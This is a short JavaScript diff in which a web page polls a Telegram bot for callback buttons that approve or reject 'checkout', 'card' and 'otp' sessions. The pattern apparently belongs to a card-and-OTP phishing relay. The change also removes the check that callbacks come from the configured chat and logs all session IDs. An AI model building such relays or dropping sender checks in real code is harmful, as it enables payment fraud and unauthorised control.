@@ -591,13 +591,23 @@
         localStorage.setItem('tg_offset', String(window.lastOffset));
         
         const cq = u.callback_query;
-        if (!cq?.message?.chat?.id) continue;
-        if (String(cq.message.chat.id) !== window.TELEGRAM_CONFIG.chatId) continue;
+        if (!cq?.data) continue;
         
         const data = cq.data || '';
-        const match = data.match(/^(approve|reject)_(checkout|card|otp):(.+)$/);
+        const match = data.match(/^(approve|reject)_(checkout|card|otp):(.+)$/i);
         if (!match) {
-          await tgCall('answerCallbackQuery', { callback_query_id: cq.id });
+          await tgCall('answerCallbackQuery', { callback_query_id: cq.id, text: 'Invalid action' });
+          console.log('No match for:', data);
+          continue;
+        }
+        
+        const [, action, kind, sessionId] = match;
+        console.log('Processing callback:', { action, kind, sessionId });
+        
+        const session = sessions.get(sessionId);
+        if (!session) {
+          await tgCall('answerCallbackQuery', { callback_query_id: cq.id, text: 'Session not found' });
+          console.log('Session not found in Map:', sessionId, 'Sessions:', Array.from(sessions.keys()));
           continue;
         }
         
